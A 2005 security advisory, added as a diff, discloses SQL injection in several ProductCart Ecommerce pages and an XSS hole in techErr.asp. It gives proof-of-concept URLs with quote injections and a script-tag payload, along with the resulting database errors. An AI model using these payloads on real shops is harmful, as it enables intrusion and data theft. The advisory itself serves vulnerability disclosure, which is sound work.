@@ -1,0 +1,118 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+    .OR.ID
+ECHO_ADV_16$2005
+
+---------------------------------------------------------------------------
+[ECHO_ADV_16$2005] Multiple SQL INJECTION in ProductCart Ecommerce 
+---------------------------------------------------------------------------
+
+Author: Dedi Dwianto
+Date: June, 07th 2005
+Location: Indonesia, Jakarta
+Web: http://echo.or.id/adv/adv16-theday-2005.txt
+
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application : ProductCart Ecommerce
+version : < 2.7
+url : http://www.earlyimpact.com/
+Author:  Early Impact
+Description: 
+
+ProductCart Ecommerce is popular ecommerce software.In somepages this software
+was filter query sql with add file msg.asp. but i found new bug where user can
+input sql query.
+
+---------------------------------------------------------------------------
+
+Vulnerabilitie:
+~~~~~~~~~~~~~~~~
+
+A. SQL Injection
+  
+     * http://victim/pc/viewPrd.asp?idcategory=[catid][SQL INJECTION]&idproduct=[prod id]
+   
+     ex :
+     http://victim/pc/viewPrd.asp?idcategory=16'&idproduct=42
+     
+     Error :
+     Microsoft OLE DB Provider for ODBC Drivers error '80040e14' 
+     [Microsoft][ODBC Microsoft Access Driver] Syntax error in string in query expression 'idcategory=16''. 
+     /apparel/productcart/pc/include-metatags.asp, line 87
+
+
+    * http://victim/pc/pcadmin/editCategories.asp?nav=&lid=[id cat][sql injection]
+     
+     ex :
+     http://victim/pc/pcadmin/editCategories.asp?nav=&lid=123'
+
+     Error :
+     Microsoft OLE DB Provider for ODBC Drivers error '80040e14' 
+
+     [Microsoft][ODBC Microsoft Access Driver] Syntax error in string in query expression 'idCategory=123' ORDER BY categoryDesc'. 
+
+     /apparel/productcart/pcadmin/editCategories.asp, line 69
+
+
+   * http://victim/pc/pcadmin/modCustomCardPaymentOpt.asp?mode=Edit&idc=[page][sqlinjection]&id=[id]&gwCode=[code]
+
+     Ex :
+     http://victim/pc/pcadmin/modCustomCardPaymentOpt.asp?mode=Edit&idc=1'&id=55&gwCode=101
+      
+     Error :
+     
+     Microsoft OLE DB Provider for ODBC Drivers error '80040e14' 
+
+     [Microsoft][ODBC Microsoft Access Driver] Syntax error (missing operator) in query expression '(((customCardTypes.idcustomCardType)=1') AND ((payTypes.gwCode)=101'))'. 
+
+     /apparel/productcart/pcadmin/modCustomCardPaymentOpt.asp, line 162
+
+    
+    * http://victim/pc/pcadmin/OptionFieldsEdit.asp?idc=1&id=[id]&idccr=[id][sql Injection]
+      
+      Ex :
+      http://victim/pc/pcadmin/OptionFieldsEdit.asp?idc=1&id=55&idccr=2'
+
+      Error :
+     
+      Microsoft OLE DB Provider for ODBC Drivers error '80040e14' 
+      [Microsoft][ODBC Microsoft Access Driver] Syntax error in string in query expression 'idCustomCardRules=2';'. 
+
+      /apparel/productcart/pcadmin/OptionFieldsEdit.asp, line 
+
+And XSS 
+POC :
+     http://victim/pc/pcadmin/techErr.asp?error=[XSS]
+     http://victim/pc/pcadmin/techErr.asp?error=<script>alert('document.cookie')</script>
+
+B. Fix
+   Sorry I can't give solution because i can't view source code becase that's commersial Software.
+   Contact vendor No response.
+
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~~~~
+
+~ y3dips, moby, comex, z3r0byt3, K-159, c-a-s-e, S`to, lirva32, anonymous
+~ Lieur Euy , MSR
+~ newbie_hacker@yahoogroups.com ,
+~ #e-c-h-o@DALNET
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~~~~
+
+     the_day || echo|staff || the_day[at]echo[dot]or[dot]id
+     Homepage: http://theday.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
